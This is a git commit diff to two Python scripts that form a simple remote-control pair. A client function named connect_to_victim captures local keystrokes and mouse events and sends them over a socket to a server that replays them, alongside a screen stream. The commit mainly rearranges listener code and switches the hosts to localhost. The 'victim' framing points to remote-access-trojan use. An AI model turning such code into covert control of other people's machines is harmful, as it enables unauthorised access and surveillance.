ec78aeab7ff8f62acc08da0ffd6dbd026ddae867
Hanan Sabz <sabzhanan@gmail.com>
2026-06-19 01:01:40 +0300

    ?

--- Controlled_Server.py
+++ Controlled_Server.py
@@ -14,7 +14,7 @@ def start_connection(server_host, server_port):
     while True:
         client_socket, client_address = server_socket.accept()
         print(f"Connection established with {client_address}")
-
+        
 
 
 def controll_keyboard(key_name, action):
@@ -39,7 +39,7 @@ def controll_mouse(x, y, button_name, action):
     elif action == "up":
         mouse.release(btn)
 
-server_host = "0.0.0.0" 
+server_host = "localhost" 
 server_port = 8000  
 start_connection(server_host, server_port)
 
--- Controller_Client.py
+++ Controller_Client.py
@@ -12,8 +12,34 @@ def connect_to_victim(server_host, server_port):
     client.connect((server_host, server_port))
     print(f"Connected to {server_host}: {server_port}")
 
+    with keyboard.Listener(on_press=on_press, on_release=on_release), mouse.Listener(on_move=on_move, on_click=on_click) as listener:
+        listener.join()
+        
 def send(msg):
-    client.send((json.dumps(msg) + "\n").encode())
+        client.send((json.dumps(msg) + "\n").encode())
+
+
+def on_press(key):
+    try:
+        send({"type": "key", "key": key.char, "action": "down"})
+    except:
+        send({"type": "key", "key": str(key), "action": "down"})
+
+def on_release(key):
+    try:
+        send({"type": "key", "key": key.char, "action": "up"})
+    except:
+        send({"type": "key", "key": str(key), "action": "up"})
+
+def on_move(x, y):
+        send({"type": "mouse_move", "x": x, "y": y})
+
+def on_click(x, y, button, pressed):
+    send({"type": "mouse_click", "button": str(button), "action": "down" if pressed else "up", "x": x, "y": y})
+
+        
+
+
 
 def screen_stream():
     print("Starting screen stream... Press ' | ' to stop.")
@@ -33,30 +59,9 @@ def screen_stream():
     # Clean up and close all windows
     cv2.destroyAllWindows()
 
-    
-def on_press(key):
-    try:
-        send({"type": "key", "key": key.char, "action": "down"})
-    except:
-        send({"type": "key", "key": str(key), "action": "down"})
 
-def on_release(key):
-    try:
-        send({"type": "key", "key": key.char, "action": "up"})
-    except:
-        send({"type": "key", "key": str(key), "action": "up"})
-
-def on_move(x, y):
-        send({"type": "mouse_move", "x": x, "y": y})
-
-def on_click(x, y, button, pressed):
-    send({"type": "mouse_click", "button": str(button), "action": "down" if pressed else "up", "x": x, "y": y})
-
-
-server_host = '192.168.1.181'
+server_host = 'localhost'          #'192.168.1.122'
 server_port = 8000
 connect_to_victim(server_host, server_port)
 
-keyboard.Listener(on_press=on_press, on_release=on_release).start()
-mouse.Listener(on_move=on_move, on_click=on_click).start()
 
